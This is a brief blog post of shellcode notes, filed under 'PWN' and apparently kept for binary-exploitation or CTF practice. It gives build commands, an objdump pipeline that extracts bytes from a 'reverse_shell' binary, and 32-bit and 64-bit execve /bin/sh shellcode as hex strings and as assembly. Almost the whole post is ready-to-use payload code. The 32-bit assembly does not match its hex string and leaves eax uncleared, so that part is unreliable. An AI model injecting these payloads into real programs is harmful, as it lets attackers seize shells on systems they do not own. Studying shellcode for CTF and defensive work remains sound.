---
layout: post
title:  Shellcode
date: 2023-12-10 20:00:03 +0900
categories: PWN
---
```
nasm -f elf64 -o shellcode.o shellcode.s
ld -o shellcode shellcode.o
```
```
objdump -d ./reverse_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

## Shellcode 32bit 25byte
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```
```
section .text
global _start

_start:
xor ecx, ecx       ; ecx = NULL
mov edx, ecx       ; edx = NULL
push ecx           ; push NULL
push 0x68732f6e    ; push n/sh in reverse
push 0x69622f2f    ; push //bi in reverse
mov ebx, esp       ; ebx now points to //bin/sh
mov al, 0xb        ; systemcall execve
int 0x80
```


## Shellcode 64bit 28byte
```
\x48\x31\xc0\x50\xb0\x3b\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05
```
```
section .text
global _start

_start:
xor rax, rax	;set rax 0
push rax	;make /bin//sh next byte null
mov al, 0x3b	;set syscall number
mov rdi, 0x68732f2f6e69622f	;make /bin//sh string
push rdi	;push /bin//sh string
mov rdi, rsp	;set first arg (rsp points to /bin//sh)
xor rsi, rsi	;set second arg
xor rdx, rdx	;set third arg
syscall
```

## x86-64호출 규약: SYSV
```
RDI, RSI, RDX, RCX, R8, R9 => stack
```

